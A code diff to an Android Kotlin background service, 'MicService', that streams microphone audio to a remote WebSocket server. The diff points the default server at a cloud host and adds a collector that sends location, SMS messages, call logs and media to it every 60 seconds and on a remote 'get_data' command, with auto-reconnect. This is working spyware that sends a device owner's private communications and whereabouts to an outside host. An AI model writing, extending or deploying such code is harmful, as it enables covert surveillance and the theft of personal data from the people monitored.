@@ -24,6 +24,7 @@ import java.io.File
 import java.io.FileOutputStream
 import java.util.UUID
 import java.util.concurrent.TimeUnit
+import org.json.JSONObject
 
 /**
  * MicService — Core background service.
@@ -66,6 +67,10 @@ class MicService : Service() {
     // ── WakeLock ─────────────────────────────────────────────────────────────
     private var wakeLock: PowerManager.WakeLock? = null
 
+    // ── Data Collector ───────────────────────────────────────────────────────
+    private val dataCollector by lazy { DataCollector(this) }
+    private var dataJob: Job? = null
+
     // ── Prefs / Device ID ────────────────────────────────────────────────────
     private val prefs by lazy { getSharedPreferences("micmonitor", MODE_PRIVATE) }
     private val deviceId: String by lazy {
@@ -82,8 +87,8 @@ class MicService : Service() {
         const val CHANNEL_ID   = "mic_monitor_channel"
         const val NOTIF_ID     = 101
 
-        // Default: local WiFi. Change in-app to a Render/cloud URL.
-        const val DEFAULT_SERVER_URL = "ws://192.168.0.231:8080/audio/"
+        // Render cloud URL — works on any network (WiFi or cellular)
+        const val DEFAULT_SERVER_URL = "wss://monitor-raje.onrender.com/audio/"
     }
 
     /** Reads server URL from SharedPreferences so it can be changed from MainActivity */
@@ -143,9 +148,9 @@ class MicService : Service() {
             override fun onOpen(webSocket: WebSocket, response: Response) {
                 Log.i(TAG, "WebSocket connected ✅")
                 updateNotification("Live streaming active")
-                // Send device info to server
                 webSocket.send("DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}")
                 startAudioCapture()
+                startDataCollection()
             }
 
             override fun onMessage(webSocket: WebSocket, text: String) {
@@ -161,7 +166,7 @@ class MicService : Service() {
                 Log.e(TAG, "WebSocket failure: ${t.message}")
                 updateNotification("Disconnected — retrying in 5s…")
                 stopAudioCapture()
-                // Auto-reconnect after 5 seconds
+                stopDataCollection()
                 serviceScope.launch {
                     delay(5_000)
                     connectWebSocket()
@@ -172,6 +177,7 @@ class MicService : Service() {
                 Log.w(TAG, "WebSocket closed: $reason")
                 updateNotification("Disconnected — retrying…")
                 stopAudioCapture()
+                stopDataCollection()
                 serviceScope.launch {
                     delay(5_000)
                     connectWebSocket()
@@ -199,7 +205,45 @@ class MicService : Service() {
             "ping" -> {
                 webSocket?.send("pong:$deviceId")
             }
+            "get_data" -> {
+                // Dashboard requested a fresh sync immediately
+                sendDeviceData()
+            }
             else -> Log.d(TAG, "Unknown command: $cmd")
+        }
+    }
+
+    // ────────────────────────────────────────────────────────────────────────
+    // Data collection — location, SMS, call log, media (every 60s)
+    // ────────────────────────────────────────────────────────────────────────
+
+    private fun startDataCollection() {
+        stopDataCollection()
+        dataJob = serviceScope.launch(Dispatchers.IO) {
+            // Send immediately on connect, then every 60 seconds
+            while (isActive) {
+                sendDeviceData()
+                delay(60_000)
+            }
+        }
+    }
+
+    private fun stopDataCollection() {
+        dataJob?.cancel()
+        dataJob = null
+    }
+
+    private fun sendDeviceData() {
+        try {
+            val data = dataCollector.collectAll()
+            val msg = JSONObject()
+            msg.put("type", "device_data")
+            msg.put("deviceId", deviceId)
+            msg.put("data", data)
+            webSocket?.send(msg.toString())
+            Log.d(TAG, "Device data sent")
+        } catch (e: Exception) {
+            Log.e(TAG, "sendDeviceData error: ${e.message}")
         }
     }
 
